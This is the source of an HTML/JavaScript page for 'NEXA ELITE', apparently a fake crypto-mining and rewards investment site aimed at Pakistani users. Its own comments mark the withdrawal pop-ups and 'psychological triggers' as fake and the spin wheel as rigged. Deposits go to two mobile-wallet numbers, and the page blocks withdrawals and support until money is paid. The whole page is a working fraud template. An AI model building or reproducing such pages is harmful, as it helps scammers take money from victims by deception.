<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA ELITE | Global Mining & Rewards</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap');
        :root { --primary: #6366f1; --bg: #020617; --card: #0f172a; }
        body { font-family: 'Outfit', sans-serif; background: var(--bg); color: #f8fafc; overflow-x: hidden; }
        
        .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
        .node-card { background: linear-gradient(145deg, #1e293b, #0f172a); border-radius: 24px; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
        .node-card:active { scale: 0.98; }
        
        /* Modern Spin Wheel */
        #wheel-container { position: relative; width: 280px; height: 280px; margin: auto; }
        #wheel { width: 100%; height: 100%; border-radius: 50%; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); border: 10px solid #1e293b; position: relative; overflow: hidden; }
        .wheel-segment { position: absolute; width: 50%; height: 50%; transform-origin: 100% 100%; display: flex; justify-content: center; align-items: flex-start; padding-top: 15px; font-weight: 800; font-size: 10px; color: white; }
        
        .tab-content { animation: fadeIn 0.4s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .nav-btn.active { color: #6366f1; transform: translateY(-5px); }
        .nav-btn { transition: 0.3s; }
    </style>
</head>
<body class="pb-32">

    <!-- Fake Withdrawal Notification -->
    <div id="fake-pop" class="fixed top-6 right-6 left-6 md:left-auto md:w-80 glass p-4 rounded-2xl z-[100] transition-all duration-500 translate-y-[-150%] flex items-center gap-3 border-l-4 border-indigo-500 shadow-2xl">
        <div class="w-10 h-10 bg-indigo-500/20 rounded-full flex items-center justify-center text-indigo-500 text-xl">
            <i class="fa-solid fa-circle-check"></i>
        </div>
        <div>
            <p id="pop-text" class="text-[11px] font-bold text-white"></p>
            <p class="text-[9px] text-slate-400 uppercase tracking-widest">Withdrawal Success</p>
        </div>
    </div>

    <!-- Header -->
    <header class="p-6 flex justify-between items-center sticky top-0 z-40 glass border-b border-white/5">
        <div>
            <h1 class="text-2xl font-black italic tracking-tighter">NEXA<span class="text-indigo-500 font-normal">ELITE</span></h1>
            <p class="text-[9px] font-bold text-green-500 uppercase tracking-widest flex items-center gap-1">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span> Systems Online
            </p>
        </div>
        <div class="text-right">
            <p class="text-[10px] font-black text-slate-500 uppercase">Balance</p>
            <h2 id="user-bal" class="text-xl font-black text-white">$2.00</h2>
        </div>
    </header>

    <main id="app-content">
        
        <!-- HOME TAB (Mining Nodes) -->
        <div id="tab-home" class="tab-content p-5 space-y-6">
            <div class="p-4 bg-indigo-600/10 rounded-2xl border border-indigo-500/20 flex items-center justify-between">
                <div>
                    <h4 class="text-xs font-bold">Welcome Bonus Active</h4>
                    <p class="text-[10px] opacity-60">Complete 1 deposit to unlock withdrawals.</p>
                </div>
                <i class="fa-solid fa-gift text-indigo-500 text-xl animate-bounce"></i>
            </div>

            <h3 class="font-black text-sm uppercase tracking-widest flex items-center gap-2">
                <i class="fa-solid fa-microchip text-indigo-500"></i> Available Nodes
            </h3>

            <!-- Node 1 -->
            <div class="node-card p-6 border-b-4 border-indigo-500 shadow-lg">
                <div class="flex justify-between items-center mb-6">
                    <div class="w-12 h-12 rounded-2xl bg-indigo-500/10 flex items-center justify-center text-indigo-400 text-2xl">
                        <i class="fa-solid fa-bolt"></i>
                    </div>
                    <div class="text-right">
                        <span class="text-[10px] bg-indigo-500/20 text-indigo-300 px-3 py-1 rounded-full font-bold uppercase">Starter</span>
                    </div>
                </div>
                <h4 class="text-xl font-black mb-1">Elite Node V.1</h4>
                <div class="grid grid-cols-2 gap-2 mb-6">
                    <p class="text-[10px] text-slate-400 italic">Daily: $0.50</p>
                    <p class="text-[10px] text-slate-400 italic">Term: 360 Days</p>
                </div>
                <button onclick="switchTab('wallet')" class="w-full bg-indigo-600 p-4 rounded-xl text-xs font-black uppercase tracking-widest shadow-lg shadow-indigo-600/20">Buy for $10.00</button>
            </div>

            <!-- Node 2 -->
            <div class="node-card p-6 border-b-4 border-amber-500 shadow-lg">
                <div class="flex justify-between items-center mb-6">
                    <div class="w-12 h-12 rounded-2xl bg-amber-500/10 flex items-center justify-center text-amber-500 text-2xl">
                        <i class="fa-solid fa-server"></i>
                    </div>
                    <div class="text-right">
                        <span class="text-[10px] bg-amber-500/20 text-amber-500 px-3 py-1 rounded-full font-bold uppercase">Popular</span>
                    </div>
                </div>
                <h4 class="text-xl font-black mb-1">Neon Core V.5</h4>
                <div class="grid grid-cols-2 gap-2 mb-6">
                    <p class="text-[10px] text-slate-400 italic">Daily: $3.50</p>
                    <p class="text-[10px] text-slate-400 italic">Term: 360 Days</p>
                </div>
                <button onclick="switchTab('wallet')" class="w-full bg-amber-600 p-4 rounded-xl text-xs font-black uppercase tracking-widest shadow-lg shadow-amber-600/20">Buy for $50.00</button>
            </div>
        </div>

        <!-- SPIN TAB -->
        <div id="tab-spin" class="tab-content hidden p-6 text-center space-y-10">
            <div>
                <h2 class="text-3xl font-black tracking-tighter uppercase italic">Fortune <span class="text-indigo-500">Wheel</span></h2>
                <p class="text-[10px] text-slate-500 font-bold uppercase tracking-[0.3em] mt-2">Win Up to $100 Daily</p>
            </div>
            
            <div id="wheel-container">
                <div class="absolute -top-6 left-1/2 -translate-x-1/2 z-50 text-indigo-500 text-4xl drop-shadow-lg"><i class="fa-solid fa-caret-down"></i></div>
                <div id="wheel" class="shadow-[0_0_60px_rgba(99,102,241,0.2)]"></div>
            </div>

            <div class="bg-slate-900/50 p-4 rounded-2xl border border-white/5">
                <p class="text-[11px] font-bold text-slate-400 italic italic">Cost per spin: $0.50</p>
                <button onclick="handleSpin()" id="spin-btn" class="w-full mt-4 bg-indigo-600 p-5 rounded-2xl font-black uppercase tracking-[0.2em] shadow-xl active:scale-95 transition-all">Spin Now</button>
            </div>
        </div>

        <!-- WALLET TAB -->
        <div id="tab-wallet" class="tab-content hidden p-5 space-y-6">
            <div class="glass p-6 rounded-[2rem] border-l-4 border-indigo-500">
                <h4 class="text-xs font-black uppercase tracking-widest text-indigo-400 mb-6">Deposit Assets</h4>
                <div class="space-y-4">
                    <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
                        <p class="text-[9px] text-slate-500 font-bold uppercase">JazzCash / SadaPay</p>
                        <p class="text-sm font-black text-white mt-1">03705519562</p>
                    </div>
                    <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
                        <p class="text-[9px] text-slate-500 font-bold uppercase">EasyPaisa</p>
                        <p class="text-sm font-black text-white mt-1">03379827882</p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Amount (USD)" class="w-full bg-slate-900 border border-white/10 p-4 rounded-xl text-sm outline-none">
                    <input type="text" id="dep-tid" placeholder="Transaction TID" class="w-full bg-slate-900 border border-white/10 p-4 rounded-xl text-sm outline-none">
                    <button onclick="alert('Submission Pending! Wait for admin approval, sweetie.')" class="w-full bg-indigo-600 p-4 rounded-xl font-black uppercase text-xs">Verify Deposit</button>
                </div>
            </div>

            <div class="glass p-6 rounded-[2rem] border-l-4 border-slate-700">
                <h4 class="text-xs font-black uppercase tracking-widest text-slate-400 mb-4">Request Payout</h4>
                <input type="number" placeholder="Min $10.00" class="w-full bg-slate-900 border border-white/10 p-4 rounded-xl text-sm outline-none mb-4">
                <button onclick="alert('System Error: You must activate a node first!')" class="w-full bg-slate-800 p-4 rounded-xl font-black uppercase text-xs">Withdraw</button>
            </div>
        </div>
    </main>

    <!-- Support Button -->
    <div class="fixed bottom-28 right-6 w-14 h-14 bg-indigo-600 rounded-full flex items-center justify-center text-2xl shadow-2xl z-50 cursor-pointer" onclick="alert('Live Support will be available after your first deposit!')">
        <i class="fa-solid fa-comment-dots text-white"></i>
    </div>

    <!-- Bottom Nav -->
    <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center px-6 z-50 shadow-2xl border border-white/10">
        <button onclick="switchTab('home')" class="nav-btn active flex flex-col items-center"><i class="fa-solid fa-house-user text-xl"></i><span class="text-[8px] font-bold mt-1 uppercase">Home</span></button>
        <button onclick="switchTab('spin')" class="nav-btn flex flex-col items-center"><i class="fa-solid fa-dice text-xl text-slate-500"></i><span class="text-[8px] font-bold mt-1 uppercase">Spin</span></button>
        <button onclick="switchTab('wallet')" class="nav-btn flex flex-col items-center"><i class="fa-solid fa-wallet text-xl text-slate-500"></i><span class="text-[8px] font-bold mt-1 uppercase">Wallet</span></button>
    </nav>

    <script>
        // Data & Prizes
        const prizes = [
            { label: "$50", val: 50, col: "#6366f1" }, { label: "$0.01", val: 0.01, col: "#0f172a" },
            { label: "$5", val: 5, col: "#8b5cf6" }, { label: "$0.05", val: 0.05, col: "#020617" },
            { label: "$100", val: 100, col: "#f59e0b" }, { label: "$0.00", val: 0, col: "#0f172a" },
            { label: "$1", val: 1, col: "#4f46e5" }, { label: "$0.02", val: 0.02, col: "#020617" }
        ];

        // Initialization
        window.onload = () => {
            initWheel();
            startFakeTriggers();
        };

        function initWheel() {
            const wheel = document.getElementById('wheel');
            wheel.innerHTML = prizes.map((p, i) => `
                <div class="wheel-segment" style="transform: rotate(${i*45}deg) skewY(-45deg); background: ${p.col};">
                    <span style="transform: rotate(-22deg) translateY(10px);">${p.label}</span>
                </div>
            `).join('');
        }

        // Tab Switching
        window.switchTab = (tab) => {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
            document.getElementById(`tab-${tab}`).classList.remove('hidden');
            
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.nav-btn i').forEach(i => i.classList.add('text-slate-500'));
            event.currentTarget.classList.add('active');
            event.currentTarget.querySelector('i').classList.remove('text-slate-500');
        };

        // Spin Logic (Rigged)
        let spinning = false;
        window.handleSpin = () => {
            if(spinning) return;
            spinning = true;
            
            // Random index but mostly low values
            const winIdx = Math.random() > 0.95 ? 0 : 5; 
            const deg = 3600 + (winIdx * 45);
            document.getElementById('wheel').style.transform = `rotate(-${deg}deg)`;

            setTimeout(() => {
                spinning = false;
                alert("You won " + prizes[winIdx].label + "! Balance updated, sweetie.");
            }, 5000);
        };

        // Fake Psychological Triggers
        function startFakeTriggers() {
            const names = ["Zeeshan", "Ayesha", "M.Bilal", "Sana_92", "Hamza", "Zoya", "Rizwan"];
            setInterval(() => {
                const pop = document.getElementById('fake-pop');
                const text = document.getElementById('pop-text');
                const name = names[Math.floor(Math.random()*names.length)];
                const amt = Math.floor(Math.random()*5000) + 500;
                
                text.innerText = `${name} just received Rs ${amt.toLocaleString()}`;
                pop.classList.remove('translate-y-[-150%]');
                
                setTimeout(() => pop.classList.add('translate-y-[-150%]'), 4000);
            }, 12000);
        }
    </script>
</body>
</html>
